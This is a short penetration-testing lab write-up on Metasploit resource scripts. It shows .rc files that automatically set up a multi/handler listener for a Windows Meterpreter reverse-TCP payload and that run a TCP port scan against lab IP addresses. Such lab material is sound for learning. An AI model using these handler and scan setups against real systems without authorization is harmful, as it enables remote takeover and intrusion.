---
title: "Resource Scripts"
description: "Automating repetitive Metasploit workflows with resource scripts (.rc): listing the pre-packaged scripts and writing custom ones to auto-configure a multi/handler and a TCP port scan, loaded with the -r flag."
date: 2025-11-12
platform: "INE Labs"
difficulty: "Easy"
tags: ["Metasploit", "Resource Scripts", "Automation", "multi/handler", "Port Scanning"]
cover: "./photo2.png"
---

# Resource Scripts

**Classification:** Host & Network Penetration Testing / The Metasploit Framework<br>
**Environment:** Kali (Metasploit automation)

## 1. Executive Summary

Metasploit **resource scripts** (`.rc`) batch a series of console commands so repetitive
setups run with one flag. Here we list the pre-packaged scripts and write two of our own —
one that auto-configures a `multi/handler`, and one that runs a TCP port scan — loading each
with `-r`.

## 2. Pre-packaged Scripts

```bash
ls -al /usr/share/metasploit-framework/scripts/resource/
```

![Listing the pre-packaged resource scripts](./photo1.png)

## 3. Handler Resource Script

Instead of configuring a handler by hand each time, write the commands to a `.rc` file.

```bash
# handler.rc
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run
```

![handler.rc contents](./photo2.png)

Loading it with `-r`.

```bash
msfconsole -r handler.rc
```

![Loading handler.rc (1)](./photo3.png)

![Handler started from the resource script (2)](./photo4.png)

## 4. Port-Scan Resource Script

```bash
# portscan.rc
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.7
run
```

![portscan.rc contents](./photo5.png)

```bash
msfconsole -r portscan.rc
```

![Loading portscan.rc (1)](./photo6.png)

![Port scan run from the resource script (2)](./photo7.png)

## 5. Notes

1. Resource scripts accept embedded Ruby (`<ruby>...</ruby>`) for advanced automation.
2. They are ideal for standardising engagement setups (handlers, workspaces, recurring
   scans) and for reproducible labs.
